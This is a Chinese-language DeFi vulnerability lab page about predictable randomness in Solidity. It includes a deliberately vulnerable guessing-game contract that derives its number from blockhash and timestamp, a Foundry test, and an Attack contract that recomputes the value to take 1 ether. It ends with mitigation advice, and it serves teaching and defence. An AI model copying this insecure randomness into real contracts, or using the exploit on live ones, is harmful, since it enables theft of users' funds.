# 随机性

[Randomness.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Randomness.sol)   

**名称：** 可预测的随机性漏洞  

**描述：**  
使用全局变量如区块哈希、区块编号、区块时间戳等字段是不安全的，矿工和攻击者可以控制它。    


**场景：**  
GuessTheRandomNumber合约是一款游戏，在这个游戏中，如果你能猜到从区块哈希和时间戳生成的伪随机数，你就可以赢得1个以太币。  

乍一看，似乎无法猜出正确的数字。  
但是让我们看看赢得这个游戏有多容易。  

 1. Alice部署GuessTheRandomNumber并存入1个以太币  
 2. Eve部署Attack合约  
 3. EVe调用Attack.attack()赢得了1个以太币



**发生了什么？**  
Attack合约通过简单地复制计算随机数的代码，计算出了正确的答案。  


**缓解措施：** 
不要使用blockhash和block.timestamp作为随机性的来源。  

**参考：**  
https://solidity-by-example.org/hacks/randomness/

**GuessTheRandomNumber合约：**  
```solidity
contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint _guess) public {
        uint answer = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}
```
**如何测试：**  
`forge test --contracts src/test/Randomness.sol -vvvv`  

```solidity
// 用于测试对存在可预测随机性漏洞合约的攻击
function testRandomness() public {
    // 将地址值从以太坊虚拟机分配给“alice”和“eve”。
    address alice = vm.addr(1);
    address eve = vm.addr(2);

    // Alice获得1个以太币
    vm.deal(address(alice), 1 ether);

    // 通过Alice的地址调用prank函数
    vm.prank(alice);

    // 创建GuessTheRandomNumberContract的实例，其余额为1个以太币
    GuessTheRandomNumberContract = new GuessTheRandomNumber{value: 1 ether}();

    // Eve的攻击开始
    vm.startPrank(eve);

    // 创建Attack合约的实例
    AttackerContract = new Attack();

    // 记录AttackerContract合约的当前余额
    console.log("Before exploiting, Balance of AttackerContract:", address(AttackerContract).balance);

    // Attack合约试图猜测GuessTheRandomNumberContract的随机数。
    AttackerContract.attack(GuessTheRandomNumberContract);

    // 再次记录AttackerContract合约的余额，以确定攻击是否成功。
    console.log("Eve wins 1 Eth, Balance of AttackerContract:", address(AttackerContract).balance);

    // 记录一条消息，表示攻击已完成。
    console.log("Exploit completed");
}


// 尝试猜测GuessTheRandomNumberContract随机数的Attack合约。
contract Attack {
    // 允许此合约接收以太币的函数
    receive() external payable {}

    // 使用与GuessTheRandomNumberContract相同的逻辑计算伪随机数并使用它来猜测数字的attack函数。
    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );

        // 使用猜测的答案调用GuessTheRandomNumber合约的guess函数。
        guessTheRandomNumber.guess(answer);
    }

    // 辅助函数，用于检查当前合约的余额。
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```
**红框：** 猜中答案并赢得比赛  
![image](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fda3d6929-9bc8-478e-a027-cff9c2a65c0d%2FUntitled.png?table=block&id=216b1af8-21a5-4e09-a63e-e4523705c968&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)